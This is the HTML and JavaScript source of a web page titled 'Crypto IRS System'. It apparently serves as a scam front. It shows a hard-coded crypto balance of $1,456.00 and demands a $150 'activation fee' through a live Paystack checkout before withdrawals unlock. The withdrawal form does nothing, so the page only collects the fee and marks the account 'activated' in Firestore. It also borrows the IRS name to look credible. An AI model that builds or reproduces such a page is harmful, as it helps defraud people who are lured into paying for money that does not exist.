<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto IRS System</title>

<style>
body{
margin:0;
font-family:Arial;
background:#0f172a;
color:white;
}

.header{
background:#1e293b;
padding:15px;
display:flex;
justify-content:space-between;
align-items:center;
position:fixed;
width:100%;
top:0;
}

.sidebar{
position:fixed;
left:-260px;
top:0;
width:250px;
height:100%;
background:#1e293b;
padding-top:70px;
transition:.3s;
}

.sidebar.active{left:0}

.sidebar a{
display:block;
padding:15px;
color:white;
text-decoration:none;
}

.sidebar a:hover{background:#00d084}

.main{
padding:80px 20px;
}

.page{display:none}
.page.active{display:block}

.card{
background:#1e293b;
padding:20px;
border-radius:10px;
margin:10px 0;
}

.btn{
background:#00d084;
padding:12px;
border:none;
color:white;
width:100%;
border-radius:10px;
margin-top:10px;
cursor:pointer;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border-radius:10px;
border:none;
}

.locked{
opacity:0.5;
pointer-events:none;
}
</style>
</head>

<body>

<div class="header">
<div onclick="toggle()">☰</div>
<h3>Crypto IRS</h3>
<div onclick="show('profile')">👤</div>
</div>

<div class="sidebar" id="side">
<a onclick="show('dashboard')">Dashboard</a>
<a onclick="show('deposit')">Activate ($150)</a>
<a onclick="show('withdraw')">Withdraw</a>
<a onclick="logout()">Logout</a>
</div>

<div class="main">

<!-- DASHBOARD -->
<div id="dashboard" class="page active">
<div class="card">
<h2>Balance</h2>
<h1>$1,456.00</h1>
<p id="status">NOT ACTIVATED</p>
</div>

<button class="btn" onclick="show('deposit')">Activate Account</button>
<button class="btn" onclick="check()">Check Access</button>
</div>

<!-- DEPOSIT -->
<div id="deposit" class="page">
<h2>Pay $150 Activation Fee</h2>
<input id="email" placeholder="Enter Email">
<button class="btn" onclick="pay()">Pay with Paystack</button>
</div>

<!-- WITHDRAW -->
<div id="withdraw" class="page">
<h2>Withdrawal</h2>

<div id="withdrawBox" class="locked">
<input placeholder="Wallet Address">
<input placeholder="Amount">
<button class="btn">Request Withdrawal</button>
</div>

<p id="msg"></p>
</div>

<!-- PROFILE -->
<div id="profile" class="page">
<h2>Profile</h2>
<p>User: Demo Account</p>
<p>Status: <span id="accStatus">Inactive</span></p>
</div>

</div>

<script src="https://js.paystack.co/v1/inline.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey:"AIzaSyDB5ydpKUhi3-PhyoN0v5USq3G22gy0",
authDomain:"crypto-irs.firebaseapp.com",
projectId:"crypto-irs",
storageBucket:"crypto-irs.appspot.com",
messagingSenderId:"942940547701",
appId:"1:942940547701:web:098cee1ab5820c4350663c"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let userEmail = "";

window.pay = function(){

userEmail = document.getElementById("email").value;

if(!userEmail){
alert("Enter email");
return;
}

let handler = PaystackPop.setup({

key:"pk_live_725e9c0357625ec847ec27b37e4d1033ac90a718",
email:userEmail,
amount:150*100,
currency:"USD",

callback: async function(res){

await setDoc(doc(db,"users",userEmail),{
email:userEmail,
activated:true
});

alert("Account Activated");
location.reload();

}

});

handler.openIframe();
}

window.check = async function(){

if(!userEmail) userEmail = document.getElementById("email").value;

const ref = doc(db,"users",userEmail);
const snap = await getDoc(ref);

if(snap.exists() && snap.data().activated){

document.getElementById("status").innerText="ACTIVATED";
document.getElementById("accStatus").innerText="Active";
document.getElementById("withdrawBox").classList.remove("locked");

}else{
alert("Not activated. Pay $150 first.");
}
}

window.toggle = function(){
document.getElementById("side").classList.toggle("active");
}

window.show = function(id){
document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
document.getElementById(id).classList.add("active");
}

window.logout = function(){
location.reload();
}

</script>

</body>
</html>
